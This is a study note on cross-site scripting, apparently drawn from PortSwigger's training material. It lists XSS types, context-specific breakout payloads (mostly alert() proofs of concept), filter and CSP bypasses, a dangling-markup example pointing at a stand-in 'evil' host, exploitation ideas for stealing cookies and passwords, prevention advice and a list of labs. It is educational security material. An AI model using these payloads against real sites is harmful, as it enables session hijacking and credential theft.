---
tags: [hacking, web, portswigger, xss]
type: vulnerability-category
source: https://portswigger.net/web-security/cross-site-scripting
last-verified: 2026-08-25
---

# Cross-site scripting (XSS)

## Up
- [[PortSwigger]]

## What it is
XSS lets an attacker inject JavaScript that runs in another user's browser in the context of the vulnerable site, compromising that user's interaction with the app. The attacker's script runs with the victim's session, so it can do anything the user can.

## Three types
- **Reflected XSS** — input in an HTTP request is echoed unsafely into the immediate response:
  ```
  https://insecure-website.com/status?message=<script>alert(1)</script>
  ```
- **Stored XSS** — input from an untrusted source (comment, profile) is stored and later served unsafely to other users:
  ```html
  <p><script>alert(1)</script></p>
  ```
- **DOM-based XSS** — client-side JS takes data from a source (e.g. `location.search`) and writes it to a dangerous sink (`innerHTML`, `document.write`) without sanitization:
  ```
  <img src=1 onerror=alert(1)>
  ```

## Impact
Session/cookie theft, credential capture, performing actions as the victim, reading their data, defacement, and delivering further attacks (e.g. XSS→CSRF). Severity scales with the victim's privileges (admin XSS ≈ full compromise).

## Finding & testing
Inject a unique marker at every entry point and see where/how it's reflected. For each reflection, work out the **context** and craft a breakout. For DOM XSS, trace sources to sinks in the JS (browser dev tools, DOM Invader). PoC with `alert(document.domain)` / `print()`.

## Injecting into different contexts
- **Between HTML tags** — inject a tag:
  ```
  <script>alert(document.domain)</script>
  <img src=1 onerror=alert(document.domain)>
  ```
- **In an HTML attribute** — break out, or add an event handler when `<>` are blocked:
  ```
  "><script>alert(document.domain)</script>
  " autofocus onfocus=alert(document.domain) x="
  ```
  `href` attributes accept the `javascript:` protocol: `<a href="javascript:alert(1)">`.
- **Into a JavaScript string** — close the string or the script:
  ```
  '-alert(document.domain)-'
  ';alert(document.domain)//
  </script><img src=1 onerror=alert(1)>
  ```
  If a backslash escapes your quote, prefix your own backslash: `\';alert(document.domain)//`. When parentheses are filtered: `onerror=alert;throw 1`.
- **Into a template literal** — expressions run inside backticks with no breakout:
  ```
  ${alert(document.domain)}
  ```
- **HTML-encoding bypass** — where quotes are blocked in an attribute, entities are decoded before JS runs: `&apos;-alert(document.domain)-&apos;`.
- **Client-side template injection** — unsafe input into AngularJS etc. lets you run template expressions (`{{constructor.constructor('alert(1)')()}}`).

## Exploiting XSS
- **Steal cookies** — exfiltrate `document.cookie` to your server (fails against `HttpOnly`/short sessions).
- **Capture passwords** — inject a form/keylogger; browser password managers can auto-fill into your injected fields.
- **Perform CSRF** — read the CSRF token via XSS and submit a state-changing request as the victim (more reliable than cookie theft).

## Mitigations & bypass surface
- **CSP (Content Security Policy)** — a response header restricting script sources; reduces impact but can be bypassed (JSONP endpoints, unsafe directives, `nonce`/`strict-dynamic` misuse).
- **Dangling markup injection** — when full script execution is blocked, inject unterminated markup (e.g. an `<img src='//evil?` ) to leak page data cross-domain.

## Prevention
- **Encode on output**, context-appropriately (HTML, attribute, JS, URL, CSS).
- **Validate input** against an allow-list where possible.
- Set `Content-Type` and `X-Content-Type-Options: nosniff` on responses.
- Use a strong **CSP** as defense-in-depth.
- Avoid dangerous DOM sinks; use safe APIs (`textContent`, framework auto-escaping, Trusted Types).

## Labs
30 labs. Verify exact titles against the live page.

### Reflected / stored basics
| Lab | Difficulty |
|---|---|
| Reflected XSS into HTML context with nothing encoded | Apprentice |
| Stored XSS into HTML context with nothing encoded | Apprentice |
| Reflected XSS into attribute with angle brackets HTML-encoded | Apprentice |
| Stored XSS into anchor href attribute with double quotes HTML-encoded | Apprentice |
| Reflected XSS into a JavaScript string with angle brackets HTML encoded | Apprentice |

### DOM-based
| Lab | Difficulty |
|---|---|
| DOM XSS in document.write sink using source location.search | Apprentice |
| DOM XSS in innerHTML sink using source location.search | Apprentice |
| DOM XSS in jQuery anchor href attribute sink using location.search source | Apprentice |
| DOM XSS in jQuery selector sink using a hashchange event | Practitioner |
| DOM XSS in document.write sink using source location.search inside a select element | Practitioner |
| DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded | Practitioner |
| Reflected DOM XSS | Practitioner |
| Stored DOM XSS | Practitioner |

### Context / filter breakouts
| Lab | Difficulty |
|---|---|
| Reflected XSS into HTML context with most tags and attributes blocked | Practitioner |
| Reflected XSS into HTML context with all tags blocked except custom ones | Practitioner |
| Reflected XSS with some SVG markup allowed | Practitioner |
| Reflected XSS in canonical link tag | Practitioner |
| Reflected XSS into a JavaScript string with single quote and backslash escaped | Practitioner |
| Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped | Practitioner |
| Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped | Practitioner |
| Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped | Practitioner |

### Exploiting XSS
| Lab | Difficulty |
|---|---|
| Exploiting cross-site scripting to steal cookies | Practitioner |
| Exploiting cross-site scripting to capture passwords | Practitioner |
| Exploiting XSS to perform CSRF | Practitioner |

### Expert (sandbox escapes / CSP)
| Lab | Difficulty |
|---|---|
| Reflected XSS with AngularJS sandbox escape without strings | Expert |
| Reflected XSS with AngularJS sandbox escape and CSP | Expert |
| Reflected XSS with event handlers and href attributes blocked | Expert |
| Reflected XSS in a JavaScript URL with some characters blocked | Expert |
| Reflected XSS protected by very strict CSP, with dangling markup attack | Expert |
| Reflected XSS protected by CSP, with CSP bypass | Expert |
